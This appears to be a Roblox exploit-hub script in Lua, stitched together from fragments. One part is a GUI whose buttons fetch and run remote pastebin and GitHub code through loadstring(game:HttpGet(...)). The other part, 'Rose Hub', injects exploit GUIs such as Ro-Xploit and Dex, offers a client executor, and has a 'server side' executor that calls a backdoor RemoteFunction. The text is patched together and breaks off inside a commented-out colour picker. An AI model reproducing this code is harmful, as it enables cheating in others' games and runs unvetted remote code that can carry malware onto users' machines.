Frame.Size = UDim2.new(0, 441, 0, 228)
Frame.Active = true
Frame.Draggable = true


TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 247, 1)
TextButton.Position = UDim2.new(0.335591137, 0, 0.416546434, 0)
TextButton.Size = UDim2.new(0, 117, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "blox fruit"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000
TextButton.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/jnCqHQXK", true))()
end)

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(243, 255, 5)
TextButton_2.Position = UDim2.new(0.335019827, 0, 0.69724822, 0)
TextButton_2.Size = UDim2.new(0, 117, 0, 50)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "mole hub"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextSize = 14.000
TextButton_2.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/jnCqHQXK", true))()
end)


TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(251, 255, 0)
TextButton_3.Position = UDim2.new(0.622088015, 0, 0.429704338, 0)
TextButton_3.Size = UDim2.new(0, 117, 0, 50)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "animefighters"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextSize = 14.000
TextButton_3.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/NBQKENww'),true))()
end)

TextButton_4.Parent = Frame
TextButton_4.BackgroundColor3 = Color3.fromRGB(247, 255, 226)
TextButton_4.Position = UDim2.new(0.622088015, 0, 0.6941064, 0)
TextButton_4.Size = UDim2.new(0, 117, 0, 50)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "ninjalegendsguis"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextSize = 14.000
TextButton_4.MouseButton1Down:connect(function()
	pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2UjrXwTV")))
end)

TextButton_5.Parent = Frame
TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
TextButton_5.Position = UDim2.new(0.0411978364, 0, 0.695726931, 0)
TextButton_5.Size = UDim2.new(0, 117, 0, 50)
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "moon hub"
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextSize = 14.000
TextButton_5.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/Gae7YC84", true))()
end)

TextButton_6.Parent = Frame
TextButton_6.BackgroundColor3 = Color3.fromRGB(251, 255, 6)
TextButton_6.Position = UDim2.new(0.0430741608, 0, 0.419411153, 0)
TextButton_6.Size = UDim2.new(0, 117, 0, 50)
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "true pice"
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextSize = 14.000
TextButton_6.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/mkMhjUGn", true))()
end)


TextButton_7.Parent = Frame
TextButton_7.BackgroundColor3 = Color3.fromRGB(255, 29, 0)
TextButton_7.Position = UDim2.new(0.106124014, 0, -0.0048931241, 0)
TextButton_7.Size = UDim2.new(0, 332, 0, 50)
TextButton_7.Font = Enum.Font.SourceSans
TextButton_7.Text = "hello this was made by alex and mole and frostify"
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 26, 19)
TextLabel.Position = UDim2.new(-0.000166296959, 0, -0.000935748219, 0)
TextLabel.Size = UDim2.new(0, 69, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "v.1"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 51, 10)
TextLabel_2.Position = UDim2.new(0.845329523, 0, -0.000935748219, 0)
TextLabel_2.Size = UDim2.new(0, 69, 0, 50)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "v.1"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 14.000

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_3.Position = UDim2.new(0.278901875, 0, 0.21836251, 0)
TextLabel_3.Size = UDim2.new(0, 194, 0, 37)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "only hubs rn scripts soon"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextSize = 14.000
end)

Section:NewButton("Gabx Hub", "Old But Gold", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/carlcoded/carlispro/main/carlhub'))()
end)

Section:NewButton("RoseHubV3.0.5", "Months old but Op as hell", function()
local start = tick()
print("Rose Hub process started.")
local VERSION = "3.0.5"
local delete = {"Rose Hub 3.0.0", "Introooo", "ColorPick"}
local tweening = false
local scriptsTabText = ""
local guiTabText = ""
local darkBack = false
local lightBack = true
local tweenService = game:GetService("TweenService")
local tweenSpeed = 0.70
local colorPickerOpen = false
local backColor = Color3.fromRGB(255, 255, 255)
local lightColor = Color3.fromRGB(255, 255, 255)
local darkColor = Color3.fromRGB(150, 150, 150)
local textColor = Color3.fromRGB(255, 255, 255)
local httpService = game:GetService("HttpService")
local savingSettings = false
local mainSettings = nil
local lighting = game:GetService("Lighting")
local workspace = game:GetService("Workspace")
local chat = game:GetService("Chat")

--Delete old GUI
function FindTable(Table, Name)
	for i,v in pairs(Table) do
		if v == Name then
			return true
		end end
	return false
 end
  
 for i,v in pairs(game:GetService("CoreGui"):GetDescendants()) do
	if v:IsA("ScreenGui") then
	if FindTable(delete, v.Name) then
		v:Destroy()
	end
 end
 end

--Create Frames
local screenGui = game:GetObjects("rbxassetid://3410845588")[1]
screenGui.Parent = game:GetService("CoreGui")
screenGui.Enabled = false
screenGui.Main.Top:FindFirstChildOfClass("TextLabel").Text = "Rose Hub "..VERSION

local colourpicker = game:GetObjects("rbxassetid://3444232310")[1]
colourpicker.Parent = game:GetService("CoreGui")
colourpicker.Enabled = false    

local intro = game:GetObjects("rbxassetid://3394996507")[1]
intro.Parent = game:GetService("CoreGui")

local function round(num)
    return math.floor(num * 10^3 + 0.5) / 10^3
end

local function createFrame(Active, BackgroundColor3, BackgroundTransparency, BorderSizePixel, ClipsDescendants, Name, Parent, Position, Size)
    local Frame = Instance.new("Frame")
    Frame.Active = Active
    Frame.BackgroundColor3 = BackgroundColor3
    Frame.BackgroundTransparency = BackgroundTransparency
    Frame.BorderSizePixel = BorderSizePixel
    Frame.ClipsDescendants = ClipsDescendants
    Frame.Name = Name
    Frame.Parent = Parent
    Frame.Position = Position
    Frame.Size = Size
    return Frame
end

local function createTextLabel(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, Position, Size, Text, TextColor3, TextSize, TextWrapped, TextXAlignment, TextYAlignment, ZIndex)
    local TextLabel = Instance.new("TextLabel")
    TextLabel.BackgroundColor3 = BackgroundColor3
    TextLabel.BackgroundTransparency = BackgroundTransparency
    TextLabel.BorderSizePixel = BorderSizePixel
    TextLabel.Font = Font
    TextLabel.Name = Name
    TextLabel.Parent = Parent
    TextLabel.Position = Position
    TextLabel.Size = Size
    TextLabel.Text = Text
    TextLabel.TextColor3 = TextColor3
    TextLabel.TextSize = TextSize
    TextLabel.TextWrapped = TextWrapped
    TextLabel.TextXAlignment = TextXAlignment
    TextLabel.TextYAlignment = TextYAlignment
    TextLabel.ZIndex = ZIndex
    return TextLabel
end

local function createTextBox(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, PlaceholderText, Position, Size, Text, TextColor3, TextSize, TextWrapped, TextXAlignment, TextYAlignment)
    local TextBox = Instance.new("TextBox")
    TextBox.BackgroundColor3 = BackgroundColor3
    TextBox.BackgroundTransparency = BackgroundTransparency
    TextBox.BorderSizePixel = BorderSizePixel
    TextBox.Font = Font
    TextBox.Name = Name
    TextBox.Parent = Parent
    TextBox.PlaceholderText = PlaceholderText
    TextBox.Position = Position
    TextBox.Size = Size
    TextBox.Text = Text
    TextBox.TextColor3 = TextColor3
    TextBox.TextSize = TextSize
    TextBox.TextWrapped = TextWrapped
    TextBox.TextXAlignment = TextXAlignment
    TextBox.TextYAlignment = TextYAlignment
    return TextBox
end

local function createTextButton(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, Position, Size, Text, TextColor3, TextSize, ZIndex, func)
    local TextButton = Instance.new("TextButton")
    TextButton.BackgroundColor3 = BackgroundColor3
    TextButton.BackgroundTransparency = BackgroundTransparency
    TextButton.BorderSizePixel = BorderSizePixel
    TextButton.Font = Font
    TextButton.Name = Name
    TextButton.Parent = Parent
    TextButton.Position = Position
    TextButton.Size = Size
    TextButton.Text = Text
    TextButton.TextColor3 = TextColor3
    TextButton.TextSize = TextSize
    TextButton.ZIndex = ZIndex
    TextButton.MouseButton1Up:Connect(func)
    return TextButton
end

local function createImageLabel(BackgroundTransparency, Image, Name, Parent, Position, Selectable, Size, ZIndex)
    local ImageLabel = Instance.new("ImageLabel")
    ImageLabel.BackgroundTransparency = BackgroundTransparency
    ImageLabel.Image = Image
    ImageLabel.Name = Name
    ImageLabel.Parent = Parent
    ImageLabel.Position = Position
    ImageLabel.Selectable = Selectable
    ImageLabel.Size = Size
    ImageLabel.ZIndex = ZIndex
    return ImageLabel
end

local function createScrollingFrame(BackgroundColor3, BackgroundTransparency, BorderSizePixel, BottomImage, CanvasSize, MidImage, Name, Parent, Position, Rotation, ScrollBarThickness, Selectable, Size, TopImage, Visible)
    local ScrollingFrame = Instance.new("ScrollingFrame")
    ScrollingFrame.BackgroundColor3 = BackgroundColor3
    ScrollingFrame.BackgroundTransparency = BackgroundTransparency
    ScrollingFrame.BorderSizePixel = BorderSizePixel
    ScrollingFrame.BottomImage = BottomImage
    ScrollingFrame.CanvasSize = CanvasSize
    ScrollingFrame.MidImage = MidImage
    ScrollingFrame.Name = Name
    ScrollingFrame.Parent = Parent
    ScrollingFrame.Position = Position
    ScrollingFrame.Rotation = Rotation
    ScrollingFrame.ScrollBarThickness = ScrollBarThickness
    ScrollingFrame.Selectable = Selectable
    ScrollingFrame.Size = Size
    ScrollingFrame.TopImage = TopImage
    ScrollingFrame.Visible = Visible
    return ScrollingFrame
end

local defaultSettings = {
	["BackgroundColorR"] = 59,
	["BackgroundColorG"] = 59,
	["BackgroundColorB"] = 59,
	["PickerColorR"] = 59,
	["PickerColorG"] = 59,
	["PickerColorB"] = 59,
	["ChangePickerBackground"] = true,
	["Transparency"] = 0.7,
	["RainbowOn"] = false,
	["RainbowSpeed"] = 75,
 }

 local function round(num)
	return math.floor(num *10^3 + 0.5) / 10^3
 end

 if writefile and readfile and pcall(function() readfile("RoseHubSettings.txt") end) then
	local file = readfile("RoseHubSettings.txt")
	local letsgo = true
	local write = false
	if pcall(function() httpService:JSONDecode(file) end) then
		file = httpService:JSONDecode(readfile("RoseHubSettings.txt"))
		mainSettings = file
	else
		mainSettings = defaultSettings
		writefile("RoseHubSettings.txt", httpService:JSONEncode(defaultSettings))
		warn("Settings file corrupted, creating new.")
		letsgo = false
	end
	if letsgo then
		for setting,value in pairs(defaultSettings) do
			if file[setting] == nil then
				writefile("RoseHubSettings.txt", httpService:JSONEncode(defaultSettings))
				warn(setting.." is missing, setting to default.")
				file[setting] = defaultSettings[setting]
				write = true
			elseif file[setting] ~= nil then
				if type(file[setting]) ~= type(defaultSettings[setting]) then
					warn(setting.." is invalid, overwriting.")
					write = true
					file[setting] = defaultSettings[setting]
				end
			end
		end
		if write == true then
			warn("Fixing settings file.")
			mainSettings = file
			writefile("RoseHubSettings.txt", httpService:JSONEncode(mainSettings))
			write = false
		end
	end
 else
	mainSettings = defaultSettings
	if writefile then
		warn("Rose Hub settings missing, creating new.")
		writefile("RoseHubSettings.txt", httpService:JSONEncode(defaultSettings))
	end
 end
  
 local savedColor = Color3.fromRGB(mainSettings.BackgroundColorR, mainSettings.BackgroundColorG, mainSettings.BackgroundColorB)
 local mainTransparency = mainSettings.Transparency
 local enableRainbow = mainSettings.RainbowOn
 local rainbowCount = mainSettings.RainbowSpeed
 local mainTrans = mainSettings.Transparency
 local changeColorPickerBack = mainSettings.ChangePickerBackground
 local colorPickerBack = Color3.fromRGB(mainSettings.PickerColorR, mainSettings.PickerColorG, mainSettings.PickerColorB)
  
 local function saveSetting(backColor, pickerColor, changeBack, tranparency, rainbowOn, rainbowSpeed)
	local settingsTab = {
		["BackgroundColorR"] = round(backColor.r*255),
		["BackgroundColorG"] = round(backColor.g*255),
		["BackgroundColorB"] = round(backColor.b*255),
		["PickerColorR"] = round(pickerColor.r*255),
		["PickerColorG"] = round(pickerColor.g*255),
		["PickerColorB"] = round(pickerColor.b*255),
		["ChangePickerBackground"] = changeBack,
		["Transparency"] = round(tranparency),
		["RainbowOn"] = rainbowOn,
		["RainbowSpeed"] = rainbowSpeed,
	}
	writefile("RoseHubSettings.txt", httpService:JSONEncode(settingsTab))
 end
  
 if darkBack then
	backColor = Color3.fromRGB(150, 150, 150)
 end

local scripttabList = {
    {"VSimFucker", "dtHywXGM", 1},

}

local modulestabList = {
    {"Work In progress", 0, 2}
	--{"Modules GUI", 03107712466, 2},
}

local guistabList = {
	{"Ro-Xploit 4.0", 175137115, 2},
	{"Ro-Xploit 5.0", 288646117, 2},
	{"Ro-Xploit 6.0", 364364477, 2},
	{"Dex 2.0", 492005721, 2},
	{"Dex 3.0", 418957341, 2},
	{"YourMom GUI", 289110135, 2},
	{"Pepe GUI", 277881926, 2},
	{"Vesprin FE GUI", 1231351616, 2},
 }

 local mapstabList = {
	{"Town Map", 1345094164, 2},
	{"Night Club", 1281063730, 2},
 }

 local lists = {
	{scripttabList, "Scripts"},
	{modulestabList, "Modules"},
	{guistabList, "GUIs"},
    {mapstabList, "Maps"},
 }

 local tabs = {
    "Home",
    "Scripts",
    "Modules",
    "Purchased Scripts",
    "GUIs",
    "Executor",
    "Server Side",
    "Maps",
    "Audios",
    "Economy",
    "Settings",
    "Credits",
}
 
function CreateInstance(cls,props)
    local inst = Instance.new(cls)
    for i,v in pairs(props) do
        inst[i] = v
    end
    return inst
end

--Copy Discord Invite
screenGui.Main.Top.Important.HomeTab.Discord.MouseButton1Up:Connect(function()
local copy = true
if pcall(function() Synapse:Copy("http://discord.io/rosehub") end) then
	
else
	local copy2 = setclipboard or Clipboard.set
	copy2("http://discord.io/rosehub")

end

screenGui.Main.Top.Important.HomeTab.Discord.Text = "Copied!"
wait(2)
screenGui.Main.Top.Important.HomeTab.Discord.Text = "Discord Server:\nhttps://discord.io/rosehub"
end)

--[[All Script Tabs,
Sort lists and insert them--]]
for _,list in pairs(lists) do
    local toSort = {}
    local sortedList = {}
    local pos = 0
    
    for _,v in pairs(list[1]) do
        table.insert(toSort, v[1])
    end
    
    table.sort(toSort)
    
    for i,name in pairs(toSort) do
        for i,actualTable in pairs(list[1]) do
            if name == actualTable[1] then
                table.insert(sortedList, {actualTable[1], actualTable[2], actualTable[3]})
            end
        end
    end
    
    --Function to create the buttons
    local function createButons(text)
        pos = 5
        for _,button in pairs(sortedList) do
            if text == "" or string.match(string.lower(button[1]), string.lower(text)) then
                createTextButton(backColor, mainTrans, 0, Enum.Font.SourceSans, button[1], screenGui.Main.Top.Important[list[2].."Tab"].Holder, UDim2.new(0, 5, 0, pos), UDim2.new(0, 181, 0, 20), button[1], textColor, 14, 1, function()
                    if button[3] == 1 then
                        loadstring(game:HttpGet("https://pastebin.com/raw/"..button[2], true))()
                    elseif button[3] == 2 then
                        loadstring(game:GetObjects("rbxassetid://"..button[2])[1].Source)()
                    end
                end)
                pos = pos + 23
            end
        end
    end
    
    --Remove Buttons and create new on search
    local function removeButtons()
        for _,button in pairs(screenGui.Main.Top.Important[list[2].."Tab"].Holder:GetChildren()) do
            button:Destroy()
        end
    end
    
    --Search Function
    screenGui.Main.Top.Important[list[2].."Tab"].Search.PlaceholderColor3 = textColor
    screenGui.Main.Top.Important[list[2].."Tab"].Search.PlaceholderText = "Search "..list[2]
    local function searchBar(chosenList)	
        local search = screenGui.Main.Top.Important[chosenList.."Tab"].Search
        local currentSearch = ""
        search.Changed:connect(function(property)
            if property == "Text" then
                if search.Text ~= "" and search.Text ~= currentSearch then
                    currentSearch = search.Text
                    removeButtons()
                    createButons(search.Text)
                elseif search.Text == "" and currentSearch.Text ~= "" then
                    currentSearch = search.Text
                    removeButtons()
                    createButons("")
                end
            end
        end)
    end	
    
    searchBar(list[2])
    
    --Create Buttons with no search
    createButons("")
    
    screenGui.Main.Top.Important[list[2].."Tab"].Holder.CanvasSize = UDim2.new(1, 0, 0, pos + 2)
end

--Tab Changer
local underline = screenGui.Main.Top.SelectedTab
local tabs = screenGui.Main.Top.Tabs:GetChildren()
local LastTab = tabs[1]
local tweening = false
local OrigSize = underline.Size
local tabPos = 0
local tweenPos = tabPos + 20
local oldTab = screenGui.Main.Top.Tabs.Home

for _,tab in next, tabs do
	if tab:IsA("TextButton") then
		local tweenPos = tabPos + 22
		tab.MouseButton1Up:Connect(function()
			if tweening == false and tab ~= oldTab then
				tweening = true
				underline:TweenSizeAndPosition(UDim2.new(0, 2, 0, 0), UDim2.new(0.5, 0, underline.Position.Y.Scale, underline.Position.Y.Offset), "Out", "Quad", tweenSpeed)
				local newUnderline = createFrame(false, backColor, 0, 0, false, "Frame", screenGui.Main.Top.Tabs, UDim2.new(0.5, 0, 1, -3), UDim2.new(0, 0, 0, 2))
				newUnderline:TweenSize(UDim2.new(0, tab.TextBounds.X, 0, 2), --[[UDim2.new(0, 55 - tab.TextBounds.X/2, 0, tweenPos),]] "Out", "Quad", tweenSpeed)
				screenGui.Main.Top.Important[tostring(oldTab).."Tab"]:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", tweenSpeed)
				screenGui.Main.Top.Important[tostring(tab).."Tab"]:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", tweenSpeed)
				screenGui.Main.Top.CurrentTab:TweenSize(UDim2.new(0, 0, 0, 31), "Out", "Quad", tweenSpeed/2)
                newUnderline.LayoutOrder = tab.LayoutOrder
                newUnderline.AnchorPoint = Vector2.new(0.5, 1)
                newUnderline.Parent = tab
                wait(tweenSpeed/2)
				screenGui.Main.Top.CurrentTab.Label.Text = tab.Name
				screenGui.Main.Top.CurrentTab:TweenSize(UDim2.new(0, 109, 0, 31), "Out", "Quad", tweenSpeed/2)
                wait(tweenSpeed/2)
				screenGui.Main.Top.Important[tostring(oldTab).."Tab"].Position = UDim2.new(-1, 0, 0, 0)
				underline:Destroy()
				underline = newUnderline
				oldTab = tab
				tweening = false
			end
		end)
		tabPos = tabPos + 26
	end
end

--Server Side
screenGui.Serverside.Active = true
screenGui.Serverside.Draggable = true

--Execute
screenGui.Main.Top.Important.ServerSideTab.ExecuteButton.MouseButton1Up:Connect(function()
    local e = game:GetService("JointsService")
    local rem = e.RemoteFunction
    assert(rem, "Remote is missing.")
    rem:InvokeServer(true, screenGui.Main.Top.Important.ServerSideTab.KeyInput.Text, screenGui.Main.Top.Important.ServerSideTab.ScriptHolder.ScriptInput.Text, {})
end)

--Clear Serverside Input
screenGui.Main.Top.Important.ServerSideTab.ClearButton.MouseButton1Up:Connect(function()
	screenGui.Main.Top.Important.ServerSideTab.ScriptHolder.ScriptInput.Text = ""
end)

-- Temp Toggle Script Editor
screenGui.Main.Top.Important.ServerSideTab.settings.MouseButton1Up:Connect(function()
	screenGui.Serverside.Visible = true
end)

--Execute In Script Editor
screenGui.Serverside.execute.MouseButton1Up:Connect(function()
    local e = game:GetService("JointsService")
    local rem = e.RemoteFunction
    assert(rem, "Remote is missing.")
    rem:InvokeServer(true, screenGui.Main.Top.Important.ServerSideTab.KeyInput.Text, screenGui.Serverside.scriptinput.Text, {})
end)

--Clear In Script Editor
screenGui.Serverside.clear.MouseButton1Up:Connect(function()
	screenGui.Serverside.scriptinput.Text = ""
end)

--Close Script Editor
screenGui.Serverside.close.MouseButton1Up:Connect(function()
    screenGui.Serverside.Visible = false
end)


--Executor
--Execute Button
screenGui.Main.Top.Important.ExecutorTab.execute.MouseButton1Up:Connect(function()
    loadstring(screenGui.Main.Top.Important.ExecutorTab.Holder.input.Text)
end)

--Clear Button
screenGui.Main.Top.Important.ExecutorTab.clear.MouseButton1Up:Connect(function()
    screenGui.Main.Top.Important.ExecutorTab.Holder.input.Text = ""
end)

--Audios Tab
local volume = 1
local audioPage = 1

local function stopSounds()
    for _,obj in pairs(lighting:GetChildren()) do
        if obj:IsA("Sound") then
            obj:Destroy()
        end
    end
    
    for i,v in pairs(chat:GetChildren()) do
        if v:IsA("Sound") then
            v:Destroy()
        end
    end

    for _,obj in pairs(workspace:GetChildren()) do
        if obj:IsA("Sound") then
            obj:Destroy()
        end
    end
end

local function playSong(id)
    stopSounds()
    local sound = Instance.new("Sound")
    sound.Parent = lighting
    sound.SoundId = "rbxassetid://"..tostring(id)
    sound.Volume = volume
    sound.Name = "RoseHubSound"
    sound.Looped = true
    sound.Playing = true
end

local audioHolder = screenGui.Main.Top.Important.AudiosTab.Holder
local audioInputBox = screenGui.Main.Top.Important.AudiosTab.audioinput
audioInputBox.PlaceholderColor3 = textColor

screenGui.Main.Top.Important.AudiosTab.Stop.MouseButton1Up:Connect(function()
    stopSounds()
end)

local volumeBox = screenGui.Main.Top.Important.AudiosTab.VolumeBox

screenGui.Main.Top.Important.AudiosTab.Set.MouseButton1Up:Connect(function()
    if tonumber(volumeBox.Text) then
        volume =  tonumber(volumeBox.Text)
        pcall(function()
            lighting.RoseHubSound.Volume = volume
        end)
    end
end)

local currentSong = screenGui.Main.Top.Important.AudiosTab.CurrentSong

screenGui.Main.Top.Important.AudiosTab.PreviousPage.MouseButton1Up:Connect(function()
    if audioPage > 1 then
        audioPage = audioPage - 1
    createAudios(audioPage)
    end
end)

screenGui.Main.Top.Important.AudiosTab.NextPage.MouseButton1Up:Connect(function()
    audioPage = audioPage + 1
    createAudios(audioPage)
end)

function createAudios(audioPage)
    local audioKeyword = audioInputBox.Text
    --local json = "https://search.roblox.com/catalog/json?Category=Audio&Keyword="..audioKeyword.."&ResultsPerPage=25&PageNumber="..tostring(audioPage)
    local json = "https://search.roblox.com/catalog/contents?CatalogContext=&Keyword="..audioKeyword.."&SortAggregation=5&LegendExpanded=true&Category=9&ResultsPerPage=25&PageNumber="..tostring(audioPage)
    local gotJson = game:HttpGet(json, true)
    local rawResult = httpService:JSONDecode(gotJson)
    local pos = 5
    for _,button in pairs(audioHolder:GetChildren()) do
        button:Destroy()
    end
    for _,tab in pairs(rawResult) do
        local scale = false
        local button = createTextButton(backColor, mainTrans, 0, Enum.Font.SourceSans, tab.Name, screenGui.Top.Important.AudiosTab.Holder, UDim2.new(0, 5, 0, pos), UDim2.new(0, 181, 0, 20), tab.Name, textColor, 14, 1, function()
            playSong(tab.AssetId)
            currentSong.Text = tab.Name
            currentSong.TextScaled = scale
        end)
        if button.TextBounds.X > button.Size.X.Offset then
            button.TextScaled = true
            scale = true
        end
        pos = pos + 23
    end
    audioHolder.CanvasSize = UDim2.new(0, 0, 0, pos + 2)
end

screenGui.Main.Top.Important.AudiosTab.search.MouseButton1Up:Connect(function()
    createAudios(1)
end)

--Remove pcall
pcall(function()
    createAudios(1)
end)

--[[local ColorPicker = {}

ColorPicker.new = function()
    pickerCreated = true
    local newMt = setmetatable({},{})
    
    local rootGui = colourpicker
    rootGui.Parent = coreGui
    rootGui.Enabled = true
    pickerGui = rootGui.ColorPicker
    local pickerTopBar = pickerGui.TopBar
    backDrop = pickerGui.Backdrop
    local pickerFrame = pickerGui.Backdrop.Content
    local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
    local colorStrip = pickerFrame.ColorStrip
    local previewFrame = pickerFrame.Preview
    local basicColorsFrame = pickerFrame.BasicColors
    local customColorsFrame = pickerFrame.CustomColors
    local okButton = pickerFrame.Ok
    local cancelButton = pickerFrame.Cancel
    local closeButton = pickerTopBar.Close
    local colorScope = colorSpace.Scope
    local colorArrow = pickerFrame.ArrowFrame.Arrow
    local hueInput = pickerFrame.Hue.Input
    local satInput = pickerFrame.Sat.Input
    local valInput = pickerFrame.Val.Input
    local redInput = pickerFrame.Red.Input
    local greenInput = pickerFrame.Green.Input
    local blueInput = pickerFrame.Blue.Input
    local user = game:GetService("UserInputService")
    local mouse = game:GetService("Players").LocalPlayer:GetMouse()
    
    local hue,sat,val = Color3.toHSV(savedColor)
    local red,green,blue = savedColor.r, savedColor.g, savedColor.b
    local chosenColor = savedColor
    local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
    local customColors = {}
    local function updateColor(noupdate)
        local relativeX,relativeY,relativeStripY = 219 - hue*219, 199 - sat*199, 199 - val*199
        local hsvColor = Color3.fromHSV(hue,sat,val)

        if noupdate == 2 or not noupdate then
            hueInput.Text = tostring(math.ceil(359*hue))
            satInput.Text = tostring(math.ceil(255*sat))
            valInput.Text = tostring(math.floor(255*val))
        end
        if noupdate == 1 or not noupdate then
            redInput.Text = tostring(math.floor(255*red))
            greenInput.Text = tostring(math.floor(255*green))
            blueInput.Text = tostring(math.floor(255*blue))
        end

        chosenColor = Color3.new(red,green,blue)

        colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
        colorStrip.ImageColor3 = Color3.fromHSV(hue,sat,1)
        colorArrow.Position = UDim2.new(0,-2,0,relativeStripY-4)
        previewFrame.BackgroundColor3 = chosenColor

        updateBack(chosenColor, backDrop)
        
        newMt.Color = chosenColor
        if newMt.Changed then 
            newMt:Changed(chosenColor)
        end
    end
    local function colorSpaceInput()
        local relativeX = mouse.X - colorSpace.AbsolutePosition.X
        local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y
            
        if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
        if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end
            
        hue = (219 - relativeX)/219
        sat = (199 - relativeY)/199

        local hsvColor = Color3.fromHSV(hue,sat,val)
        red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

        updateColor()
    end
    local function colorStripInput()
        local relativeY = mouse.Y - colorStrip.AbsolutePosition.Y

        if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	

        val = (199 - relativeY)/199

        local hsvColor = Color3.fromHSV(hue,sat,val)
        red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

        updateColor()
    end
    local function hookButtons(frame,func)
        frame.ArrowFrame.Up.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Up.BackgroundTransparency = 0.5
            elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
                local releaseEvent,runEvent
        
                local startTime = tick()
                local pressing = true
                local startNum = tonumber(frame.Text)
        
                if not startNum then return end
        
                releaseEvent = user.InputEnded:Connect(function(input)
                    if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                    releaseEvent:Disconnect()
                    pressing = false
                end)
        
                startNum = startNum + 1
                func(startNum)
                while pressing do
                    if tick()-startTime > 0.3 then
                        startNum = startNum + 1
                        func(startNum)
                    end
                    wait(0.1)
                end
            end
        end)

        frame.ArrowFrame.Up.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Up.BackgroundTransparency = 1
            end
